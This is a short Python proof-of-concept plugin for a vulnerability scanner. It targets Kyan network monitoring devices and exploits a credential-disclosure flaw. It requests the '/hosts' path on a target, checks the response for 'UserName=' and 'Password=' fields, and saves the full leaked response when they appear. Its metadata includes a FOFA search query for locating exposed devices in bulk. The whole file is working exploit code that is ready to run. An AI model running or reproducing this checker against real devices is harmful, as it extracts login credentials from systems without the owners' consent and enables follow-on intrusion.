#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'http://wiki.fofamini.com/漏洞库/IOT安全/Kyan/Kyan 网络监控设备 账号密码泄漏漏洞.md',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Kyan网络监控设备密码泄露',

      'level'     :   'high',

      'FOFA'      :   'title="platform - Login"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/hosts'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if re.search(r'UserName=.*?Password=.*?',res.text,re.S):
      ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret